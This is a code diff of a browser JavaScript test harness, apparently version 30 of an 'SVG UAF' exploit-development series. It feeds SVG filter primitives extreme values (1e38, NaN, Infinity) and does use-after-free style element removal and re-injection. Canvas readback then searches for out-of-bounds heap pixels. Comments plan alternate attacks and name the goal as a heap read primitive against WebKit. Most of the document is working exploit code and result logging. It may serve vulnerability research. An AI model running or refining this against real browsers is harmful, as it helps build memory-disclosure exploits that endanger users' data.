+  filter.setAttribute('width', '1100%'); filter.setAttribute('height', '1100%');
+  filter.setAttribute('filterUnits', 'userSpaceOnUse');
+  filter.setAttribute('color-interpolation-filters', 'sRGB');
+
+  var disp2 = document.createElementNS(SVG_NS, 'feDisplacementMap');
+  disp2.setAttribute('in', 'SourceGraphic');
+  disp2.setAttribute('in2', 'SourceGraphic');
+  disp2.setAttribute('scale', '5');
+  disp2.setAttribute('xChannelSelector', 'R');
+  disp2.setAttribute('yChannelSelector', 'G');
+  disp2.setAttribute('x', '-9999'); disp2.setAttribute('y', '-9999');
+  disp2.setAttribute('width', '99999'); disp2.setAttribute('height', '99999');
+
+  filter.appendChild(disp2);
+  defs.appendChild(filter);
+  outerSvg.appendChild(defs);
+
+  var target2 = document.createElementNS(SVG_NS, 'rect');
+  target2.setAttribute('x', '100'); target2.setAttribute('y', '100');
+  target2.setAttribute('width', '100'); target2.setAttribute('height', '100');
+  target2.setAttribute('fill', 'rgb(255,0,0)');
+  target2.setAttribute('filter', 'url(#fbp_f)');
+  outerSvg.appendChild(target2);
+  document.body.appendChild(outerSvg);
+  await raf(); await raf();
+
+  // UAF inject 1e38
+  disp2.remove();
+  await raf();
+  try { disp2.scale.baseVal = BIG; } catch(e) {}
+  filter.appendChild(disp2);
+  await raf(); await raf();
+  log('  UAF scale injected: ' + (disp2.scale ? disp2.scale.baseVal : '?'), 'ok');
+
+  // Serialize + canvas readback
+  var svgStr2 = new XMLSerializer().serializeToString(outerSvg);
+  var blob2 = new Blob([svgStr2], { type: 'image/svg+xml' });
+  var url2 = URL.createObjectURL(blob2);
+  var img2 = new Image();
+
+  var uafNonZero = await new Promise(function(resolve) {
+    img2.onload = function() {
+      try {
+        ctx.clearRect(0, 0, W, H);
+        ctx.drawImage(img2, 0, 0);
+        var px2 = ctx.getImageData(0, 0, W, H);
+        var nz2 = 0;
+        for (var pi2 = 0; pi2 < px2.data.length; pi2 += 4) {
+          if (px2.data[pi2] || px2.data[pi2+1] || px2.data[pi2+2]) nz2++;
+        }
+        resolve(nz2);
+      } catch(e3) { resolve(-1); }
+    };
+    img2.onerror = function() { resolve(-2); };
+    img2.src = url2;
+    setTimeout(function() { resolve(-3); }, 2000);
+  });
+  URL.revokeObjectURL(url2);
+
+  document.body.removeChild(outerSvg);
+  log('  UAF scale=1e38 nonZeroPixels=' + uafNonZero, uafNonZero > 0 ? 'bad' : 'ok');
+
+  if (!q) dis(false);
+  return { results: results, uafNonZero: uafNonZero };
+}
+
+/*
+ * FIM: feImage as displacement map source with controlled pixel values
+ *
+ * Instead of using SourceGraphic as both source and map (which gives
+ * whatever the rect's own colors are as displacement factors),
+ * use feImage to load a data: URI image with EXACTLY the pixel values we want.
+ *
+ * Control: we want R = value such that scale * (R - 0.5) = delta_we_want.
+ * For scale=100 and delta=50: R = 0.5 + 50/100 = 1.0 -> pixel 255. Fine.
+ * For scale=100 and delta=99: R = 0.5 + 99/100 = 1.49 -> clamped to 255. Hmm.
+ * Max delta with scale=100: R=255/255=1.0, delta=100*(1-0.5)=50px.
+ * So at scale=100, max displacement is 50px. And the canvas is 200px wide.
+ * Center of rect is at (100,100). Max displaced source X = 150. Still within canvas.
+ * Need scale > 150 to displace (100,100) outside 200px canvas.
+ * At scale=200: delta = 200*0.5 = 100. srcX = 100+100 = 200. Just outside.
+ * At scale=201: srcX = 100 + 201*0.5 = 200.5. Outside!
+ *
+ * CREATE: data: URI 1x1 PNG with exact R/G values.
+ * Use R=255 (full red channel = max X displacement).
+ * feImage (1x1 pixel R=255) tiled via feFlood+feComposite to fill the region.
+ * Then feDisplacementMap(in=SourceGraphic, in2=tiled_map) with scale > 150.
+ * Result: every pixel displaced by (scale*0.5) pixels in X.
+ * When scale > 200, displacement > 100px from center, puts center pixel outside canvas.
+ *
+ * This gives EXACT CONTROL over displacement direction and magnitude.
+ * With scale=201 and R=255: pixel at (100,100) samples from (100+100.5) = OOB.
+ * But WebKit clamps to transparent. Same result as before.
+ *
+ * ALTERNATE ATTACK: what about feConvolveMatrix with 1e38 kernel values?
+ * feConvolveMatrix does: output = sum(kernel[i,j] * input[x+i, y+j])
+ * For each output pixel, reads MULTIPLE input pixels (within bounds = fine).
+ * But with 1e38 kernel value: output = 1e38 * input = overflow.
+ * Output is then stored back as float. If stored as int: overflow.
+ * DIFFERENT CODE PATH from feDisplacementMap. Worth testing.
+ */
+async function runFIM(q) {
+  if (!q) { dis(true); sep(); log('FIM: feConvolveMatrix with 1e38 kernel + feComponentTransfer', 'inf'); sep(); }
+
+  var W = 200; var H = 200;
+  var cnv = document.createElement('canvas');
+  cnv.width = W; cnv.height = H;
+  var ctx = cnv.getContext('2d');
+  if (!ctx) { log('  [!] no canvas ctx', 'bad'); if (!q) dis(false); return {}; }
+
+  // Test 1: feConvolveMatrix with 1e38 kernel values (baked into SVG string)
+  log('  test1: feConvolveMatrix kernelMatrix=1e38 (1x1 kernel)', 'inf');
+
+  var kernelTests = [
+    { name: 'normal-1',    kernel: '1',               order: '1' },
+    { name: 'normal-255',  kernel: '255',             order: '1' },
+    { name: 'kernel-1e10', kernel: '1e10',            order: '1' },
+    { name: 'kernel-1e20', kernel: '1e20',            order: '1' },
+    { name: 'kernel-1e38', kernel: '1e38',            order: '1' },
+    { name: 'kernel-3x3',  kernel: '0 0 0 0 1e38 0 0 0 0', order: '3' }, // 3x3 center=1e38
+    { name: 'kernel-neg',  kernel: '-1e38',           order: '1' },
+    { name: 'divisor-0',   kernel: '1',               order: '1', divisor: '0' } // div by zero
+  ];
+
+  for (var ki = 0; ki < kernelTests.length; ki++) {
+    var kt = kernelTests[ki];
+    var divAttr = kt.divisor !== undefined ? ' divisor="' + kt.divisor + '"' : '';
+    var svgStr = '<svg xmlns="http://www.w3.org/2000/svg" width="' + W + '" height="' + H + '">' +
+      '<defs><filter id="f" color-interpolation-filters="sRGB">' +
+        '<feConvolveMatrix order="' + kt.order + '"' +
+          ' kernelMatrix="' + kt.kernel + '"' +
+          divAttr + '/>' +
+      '</filter></defs>' +
+      '<rect x="50" y="50" width="100" height="100" fill="rgb(200,100,50)" filter="url(#f)"/>' +
+    '</svg>';
+
+    var blob = new Blob([svgStr], { type: 'image/svg+xml' });
+    var url = URL.createObjectURL(blob);
+    var img = new Image();
+
+    var px100 = await new Promise(function(resolve) {
+      img.onload = function() {
+        try {
+          ctx.clearRect(0, 0, W, H);
+          ctx.drawImage(img, 0, 0);
+          var px = ctx.getImageData(100, 100, 1, 1);
+          resolve([px.data[0], px.data[1], px.data[2], px.data[3]]);
+        } catch(e2) { resolve(null); }
+      };
+      img.onerror = function() { resolve(null); };
+      img.src = url;
+      setTimeout(function() { resolve(null); }, 2000);
+    });
+    URL.revokeObjectURL(url);
+
+    var note = '';
+    if (px100) {
+      if (px100[0] === 200 && px100[3] === 255) note = ' (passthrough - kernel no-op)';
+      else if (px100[3] === 0) note = ' (transparent - filtered out)';
+      else if (px100[0] === 255) note = ' (clamped to white)';
+      else note = ' <- UNEXPECTED VALUE';
+    }
+    log('  ' + kt.name + ': px[100,100]=' + (px100 ? px100 : 'err') + note,
+        note.indexOf('UNEXPECTED') >= 0 ? 'bad' : 'dim');
+  }
+
+  // Test 2: feComponentTransfer with 1e38 in tableValues
+  log('  test2: feComponentTransfer feFuncR type=table tableValues=1e38', 'inf');
+  var compTests = [
+    { name: 'normal',       vals: '0 1',              type: 'table' },
+    { name: 'table-1e38',   vals: '0 1e38',           type: 'table' },
+    { name: 'table-neg',    vals: '-1e38 1e38',       type: 'table' },
+    { name: 'linear-1e38',  slope: '1e38', intercept: '0', type: 'linear' },
+    { name: 'linear-neg',   slope: '-1e38', intercept: '1e38', type: 'linear' },
+    { name: 'gamma-1e38',   amplitude: '1e38', exponent: '1', offset: '0', type: 'gamma' },
+    { name: 'gamma-exp',    amplitude: '1', exponent: '1e38', offset: '0', type: 'gamma' }
+  ];
+
+  for (var ci = 0; ci < compTests.length; ci++) {
+    var ct = compTests[ci];
+    var funcAttrs = 'type="' + ct.type + '"';
+    if (ct.type === 'table')  funcAttrs += ' tableValues="' + ct.vals + '"';
+    if (ct.type === 'linear') funcAttrs += ' slope="' + ct.slope + '" intercept="' + ct.intercept + '"';
+    if (ct.type === 'gamma')  funcAttrs += ' amplitude="' + ct.amplitude + '" exponent="' + ct.exponent + '" offset="' + ct.offset + '"';
+
+    var svgStr2 = '<svg xmlns="http://www.w3.org/2000/svg" width="' + W + '" height="' + H + '">' +
+      '<defs><filter id="g" color-interpolation-filters="sRGB">' +
+        '<feComponentTransfer>' +
+          '<feFuncR ' + funcAttrs + '/>' +
+        '</feComponentTransfer>' +
+      '</filter></defs>' +
+      '<rect x="50" y="50" width="100" height="100" fill="rgb(100,100,100)" filter="url(#g)"/>' +
+    '</svg>';
+
+    var blob2 = new Blob([svgStr2], { type: 'image/svg+xml' });
+    var url2 = URL.createObjectURL(blob2);
+    var img2 = new Image();
+
+    var px2 = await new Promise(function(resolve) {
+      img2.onload = function() {
+        try {
+          ctx.clearRect(0, 0, W, H);
+          ctx.drawImage(img2, 0, 0);
+          var p = ctx.getImageData(100, 100, 1, 1);
+          resolve([p.data[0], p.data[1], p.data[2], p.data[3]]);
+        } catch(e3) { resolve(null); }
+      };
+      img2.onerror = function() { resolve(null); };
+      img2.src = url2;
+      setTimeout(function() { resolve(null); }, 2000);
+    });
+    URL.revokeObjectURL(url2);
+
+    var note2 = '';
+    if (px2) {
+      if (px2[0] === 100) note2 = ' (passthrough)';
+      else if (px2[0] === 255) note2 = ' (clamped max)';
+      else if (px2[0] === 0) note2 = ' (clamped 0 or zeroed)';
+      else note2 = ' <- UNEXPECTED: R=' + px2[0];
+    }
+    log('  ' + ct.name + ': px=' + (px2 ? px2 : 'err') + note2,
+        note2.indexOf('UNEXPECTED') >= 0 ? 'bad' : 'dim');
   }
 
   if (!q) dis(false);
-  return { thresholdScale: thresholdScale };
+  return {};
+}
+
+/*
+ * FCM: feColorMatrix with 1e38 values
+ *
+ * feColorMatrix type="matrix" applies a 4x5 matrix to RGBA values.
+ * Default identity: "1 0 0 0 0  0 1 0 0 0  0 0 1 0 0  0 0 0 1 0"
+ * With 1e38 in position [0,0]: R_out = 1e38 * R_in + 0*G + 0*B + 0*A + 0
+ * For R_in = 200/255 = 0.784: R_out = 1e38 * 0.784 = 7.84e37
+ * This is then clamped to [0,1] before storing = 1.0 = R=255. Boring.
+ *
+ * BUT: what about type="saturate" with values="1e38"?
+ * Saturation matrix = identity + (s-1) * some_matrix_terms.
+ * With s=1e38: matrix values become enormous before clamping.
+ * Intermediate values = 1e38 * R etc. stored as float: fine, clamped after.
+ *
+ * INTERESTING: type="hueRotate" with values="1e38"
+ * hueRotate angle=1e38 radians -> angle % (2*PI) = angle - floor(angle/(2PI)) * 2*PI
+ * floor(1e38 / 6.28) = floor(1.59e37) = some large int.
+ * 1e38 - large_int * 6.28 = residual angle.
+ * Mod operation on 1e38: potential integer overflow in floor().
+ *
+ * ALSO: feColorMatrix type="matrix" with values containing NaN/Inf.
+ * (Use "Infinity" as the string — browser may parse it.)
+ */
+async function runFCM(q) {
+  if (!q) { dis(true); sep(); log('FCM: feColorMatrix type=hueRotate/saturate/matrix with 1e38', 'inf'); sep(); }
+
+  var W = 200; var H = 200;
+  var cnv = document.createElement('canvas');
+  cnv.width = W; cnv.height = H;
+  var ctx = cnv.getContext('2d');
+  if (!ctx) { log('  [!] no canvas ctx', 'bad'); if (!q) dis(false); return {}; }
+
+  var fcmTests = [
+    { name: 'hue-normal',    type: 'hueRotate', values: '180' },
+    { name: 'hue-1e10',      type: 'hueRotate', values: '1e10' },
+    { name: 'hue-1e20',      type: 'hueRotate', values: '1e20' },
+    { name: 'hue-1e38',      type: 'hueRotate', values: '1e38' },
+    { name: 'hue-neg-1e38',  type: 'hueRotate', values: '-1e38' },
+    { name: 'hue-Infinity',  type: 'hueRotate', values: 'Infinity' },
+    { name: 'hue-NaN',       type: 'hueRotate', values: 'NaN' },
+    { name: 'sat-normal',    type: 'saturate',  values: '2' },
+    { name: 'sat-1e38',      type: 'saturate',  values: '1e38' },
+    { name: 'sat-neg',       type: 'saturate',  values: '-1e38' },
+    { name: 'matrix-1e38',   type: 'matrix',    values: '1e38 0 0 0 0  0 1 0 0 0  0 0 1 0 0  0 0 0 1 0' },
+    { name: 'matrix-all',    type: 'matrix',    values: '1e38 1e38 1e38 1e38 1e38  1e38 1e38 1e38 1e38 1e38  1e38 1e38 1e38 1e38 1e38  1e38 1e38 1e38 1e38 1e38' }
+  ];
+
+  var baseR = -1;
+  for (var fi = 0; fi < fcmTests.length; fi++) {
+    var ft = fcmTests[fi];
+    var svgStr = '<svg xmlns="http://www.w3.org/2000/svg" width="' + W + '" height="' + H + '">' +
+      '<defs><filter id="fc" color-interpolation-filters="sRGB">' +
+        '<feColorMatrix type="' + ft.type + '" values="' + ft.values + '"/>' +
+      '</filter></defs>' +
+      '<rect x="50" y="50" width="100" height="100" fill="rgb(200,100,50,1.0)" filter="url(#fc)"/>' +
+    '</svg>';
+
+    var blob = new Blob([svgStr], { type: 'image/svg+xml' });
+    var url = URL.createObjectURL(blob);
+    var img = new Image();
+
+    var px = await new Promise(function(resolve) {
+      img.onload = function() {
+        try {
+          ctx.clearRect(0, 0, W, H);
+          ctx.drawImage(img, 0, 0);
+          var p = ctx.getImageData(100, 100, 1, 1);
+          resolve([p.data[0], p.data[1], p.data[2], p.data[3]]);
+        } catch(e2) { resolve(null); }
+      };
+      img.onerror = function() { resolve(null); };
+      img.src = url;
+      setTimeout(function() { resolve(null); }, 2000);
+    });
+    URL.revokeObjectURL(url);
+
+    if (fi === 0 && px) baseR = px[0]; // baseline hueRotate=180 R value
+
+    var note = '';
+    if (px) {
+      var rDiff = px[0] - baseR;
+      if (Math.abs(rDiff) > 5) note = ' <- DIFFERENT from baseline (R diff=' + rDiff + ')';
+    }
+    log('  ' + ft.name + ': px=' + (px ? px.slice(0,3) : 'err') + note,
+        note.length > 0 ? 'inf' : 'dim');
+  }
+
+  if (!q) dis(false);
+  return {};
 }
 
 // RUN ALL
 async function runAll() {
   dis(true); clearLog(); sep();
-  log('SVG UAF v29 - controlled overflow + self-displace filter + dasharray + scale sweep', 'inf');
+  log('SVG UAF v30 - wide overflow map + filter bypass + feConvolve + feColorMatrix', 'inf');
   sep();
 
   var results = {};
   var tests = [
-    ['OVM_overflow_map',   runOVM],
-    ['SDF_self_displace',  runSDF],
-    ['DSH_dasharray_fixed', runDSH],
-    ['SWP_scale_sweep',    runSWP]
+    ['OWS_wide_sweep',     runOWS],
+    ['FBP_filter_bypass',  runFBP],
+    ['FIM_convolve_comp',  runFIM],
+    ['FCM_colormatrix',    runFCM]
   ];
 
   for (var i = 0; i < tests.length; i++) {
@@ -554,32 +668,23 @@ async function runAll() {
   }
 
   sep();
-  log('SUMMARY v29', 'inf');
+  log('SUMMARY v30', 'inf');
   sep();
   var keys = Object.keys(results);
   for (var ki = 0; ki < keys.length; ki++) {
     var k = keys[ki];
     var r = results[k];
     if (!r) { log('  ' + k + ': ERROR', 'bad'); continue; }
-    if (r.nonzeroDeltaCount !== undefined)
-      log('  ' + k + ': nonzeroDeltaCount=' + r.nonzeroDeltaCount + ' base=' + r.base,
-          r.nonzeroDeltaCount > 0 ? 'bad' : 'ok');
-    else if (r.pixelsLeak !== undefined)
-      log('  ' + k + ': crashed=' + r.crashed + ' pixelsLeak=' + r.pixelsLeak,
-          r.crashed || r.pixelsLeak > 0 ? 'bad' : 'ok');
-    else if (r.wrote !== undefined)
-      log('  ' + k + ': wrote=' + r.wrote + ' crashed=' + r.crashed,
-          r.crashed ? 'bad' : 'ok');
-    else if (r.thresholdScale !== undefined)
-      log('  ' + k + ': thresholdScale=' + (r.thresholdScale ? r.thresholdScale.toExponential(0) : 'none'), 'inf');
+    if (r.span !== undefined)      log('  ' + k + ': span=' + r.span + ' min=' + r.min + ' max=' + r.max, r.span > 4 ? 'bad' : 'ok');
+    else if (r.uafNonZero !== undefined) log('  ' + k + ': uafNonZero=' + r.uafNonZero, r.uafNonZero > 0 ? 'bad' : 'ok');
     else log('  ' + k + ': ran', 'ok');
   }
   log('');
   log('  KEY:', 'inf');
-  log('  OVM nonzeroDeltaCount>0 -> y-pos controls overflow value (controllable int32)', 'inf');
-  log('  SDF pixelsLeak>0 -> OOB read visible in canvas (heap read primitive!)', 'inf');
-  log('  SDF crashed -> OOB hit unmapped page (crash = confirmed vuln)', 'inf');
-  log('  SWP thresholdScale -> exact scale where rasterizer stops clamping', 'inf');
+  log('  OWS span > 4 -> overflow range wider (more controllable)', 'inf');
+  log('  FBP uafNonZero > 0 -> oversized region captured OOB pixels!', 'inf');
+  log('  FIM UNEXPECTED -> feConvolve/feComponent overflow in rasterizer', 'inf');
+  log('  FCM DIFFERENT  -> feColorMatrix 1e38 produces unexpected output', 'inf');
   sep();
   dis(false);
 }
